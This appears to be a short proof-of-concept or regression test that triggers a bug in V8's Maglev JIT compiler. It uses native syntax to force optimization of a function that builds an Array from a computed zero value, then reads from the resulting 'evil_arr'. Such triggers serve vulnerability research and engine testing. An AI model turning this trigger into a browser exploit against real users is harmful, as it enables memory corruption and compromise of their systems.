const factor = 9.223372036854776e+18;
const value = 0 / factor;
let use;
function opt_me() {
    use = value;
    const arr = Array(value);
    return arr;
}
const v11 = %PrepareFunctionForOptimization(opt_me);
opt_me();
const v13 = %OptimizeMaglevOnNextCall(opt_me);
let evil_arr = opt_me();
print(evil_arr[0]);
